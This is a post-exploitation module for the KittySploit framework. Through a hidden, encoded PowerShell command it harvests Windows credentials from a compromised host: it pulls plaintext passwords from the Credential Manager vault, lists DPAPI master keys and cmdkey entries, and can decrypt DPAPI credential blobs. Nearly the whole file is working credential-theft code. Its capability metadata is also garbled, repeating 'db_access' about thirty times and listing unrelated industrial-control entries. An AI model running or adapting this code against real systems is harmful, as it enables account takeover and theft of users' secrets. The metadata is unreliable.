#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
import base64


class Module(Post):
    __info__ = {
        "name": "Windows Gather DPAPI Credentials",
        "description": (
            "Collect DPAPI master keys, Credential Manager vault entries, and cmdkey "
            "stored credentials without external Mimikatz"
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL, SessionType.WINRM],
        "references": ["https://attack.mitre.org/techniques/T1555/003/"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation'],
        'expected_requests': 3,
        'reversible': False,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 's7comm', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'ot_assets', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    include_vault = OptBool(True, "Dump Windows Credential Manager vault", False)
    include_master_keys = OptBool(True, "List DPAPI master key files", False)
    include_cmdkey = OptBool(True, "List cmdkey stored credentials", False)
    try_decrypt_blobs = OptBool(False, "Attempt CurrentUser DPAPI decrypt on small blobs", False)

    def _execute_cmd(self, command: str) -> str:
        if not command:
            return ""
        output = self.cmd_execute(command)
        return output.strip() if output else ""

    def _run_powershell(self, script: str) -> str:
        encoded = base64.b64encode(script.encode("utf-16le")).decode("ascii")
        return self._execute_cmd(f"powershell -NoP -NonI -W Hidden -EncodedCommand {encoded}")

    def _ps_script(self) -> str:
        return r"""
$ErrorActionPreference = 'Stop'
function Out-Section($Title, $Text) {
    Write-Output ('=== ' + $Title + ' ===')
    if ($Text) { Write-Output $Text } else { Write-Output '(none)' }
}

$user = $env:USERPROFILE
$local = $env:LOCALAPPDATA
$masterPaths = @(
    Join-Path $user 'AppData\Roaming\Microsoft\Protect',
    Join-Path $local 'Microsoft\Protect'
) | Where-Object { Test-Path $_ }

$mk = @()
foreach ($p in $masterPaths) {
    Get-ChildItem -Path $p -Recurse -Filter '*.xml' -ErrorAction SilentlyContinue |
        Select-Object FullName, Length, LastWriteTime |
        ForEach-Object { $mk += "$($_.FullName) [$($_.Length) bytes] $($_.LastWriteTime)" }
}
Out-Section 'DPAPI master keys' ($mk -join "`n")

$cmdkey = cmdkey /list 2>&1 | Out-String
Out-Section 'cmdkey' $cmdkey

try {
    Add-Type -AssemblyName System.Security
    [void][Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType = WindowsRuntime]
    $vault = New-Object Windows.Security.Credentials.PasswordVault
    $entries = $vault.RetrieveAll() | ForEach-Object {
        $_.RetrievePassword()
        [PSCustomObject]@{ Resource = $_.Resource; UserName = $_.UserName; Password = $_.Password }
    }
    if ($entries) {
        Out-Section 'Password Vault' (($entries | Format-Table -AutoSize | Out-String).Trim())
    } else {
        Out-Section 'Password Vault' 'No vault entries'
    }
} catch {
    Out-Section 'Password Vault' ('Unavailable: ' + $_.Exception.Message)
}

$blobPaths = @(
    Join-Path $user 'AppData\Local\Google\Chrome\User Data\Default\Login Data',
    Join-Path $user 'AppData\Roaming\Microsoft\Credentials'
) | Where-Object { Test-Path $_ }
Out-Section 'DPAPI-related paths' (($blobPaths | ForEach-Object { $_ }) -join "`n")
"""

    def _decrypt_script(self) -> str:
        return r"""
$ErrorActionPreference = 'SilentlyContinue'
Add-Type -AssemblyName System.Security
$paths = @(
    "$env:APPDATA\Microsoft\Credentials\*",
    "$env:LOCALAPPDATA\Microsoft\Credentials\*"
)
$results = @()
Get-ChildItem $paths -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object {
    try {
        $bytes = [IO.File]::ReadAllBytes($_.FullName)
        if ($bytes.Length -gt 8192) { return }
        $plain = [Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
        $text = [Text.Encoding]::Unicode.GetString($plain)
        if ($text) { $results += "$($_.Name): $text" }
    } catch {}
}
if ($results) { $results -join "`n" } else { 'No CurrentUser DPAPI blobs decrypted' }
"""

    def run(self):
        ps_check = self._execute_cmd('powershell -NoP -Command "Write-Output OK"')
        if "OK" not in ps_check:
            raise ProcedureError(FailureType.NotCompatible, "PowerShell is not available on the target")

        print_info("=" * 80)
        print_status("DPAPI / credential store collection")

        if self.include_master_keys or self.include_vault or self.include_cmdkey:
            output = self._run_powershell(self._ps_script())
            if output:
                for line in output.splitlines():
                    print_info(line)
            else:
                print_warning("PowerShell collector returned no output")

        if self.try_decrypt_blobs:
            print_info("-" * 80)
            print_status("CurrentUser DPAPI blob decrypt attempt")
            decrypted = self._run_powershell(self._decrypt_script())
            if decrypted:
                for line in decrypted.splitlines()[:40]:
                    print_info(f"  {line}")

        print_info("=" * 80)
        print_success("DPAPI credential gathering completed")
        return True
